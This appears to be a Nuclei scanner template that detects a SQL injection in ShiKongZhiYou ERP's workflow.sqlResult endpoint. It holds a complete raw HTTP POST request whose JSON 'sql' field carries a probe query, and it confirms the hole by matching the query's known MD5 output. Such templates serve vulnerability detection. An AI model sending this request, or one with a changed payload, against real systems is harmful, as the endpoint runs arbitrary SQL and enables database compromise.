id: cvd-2022-5286
info:
  name: ShiKongZhiYou ERP Workflow.sqlResult SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    ShiKongZhiYou ERP has a SQL injection vulnerability in the workflow.sqlResult endpoint, allowing remote attackers to execute arbitrary SQL statements and gain database permissions.
  reference:
    - http://www.91skzy.com/
  tags: sql-injection

variables:
  sql_payload: "select sys.fn_varbintohexstr(hashbytes('MD5','123456'));"

http:
  - raw:
      - |
        POST /formservice?service=workflow.sqlResult HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Content-Type: application/json

        {"sql":"{{sql_payload}}","params":{"a":"11"}}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "e10adc3949ba59abbe56e057f20f883e"
        part: body
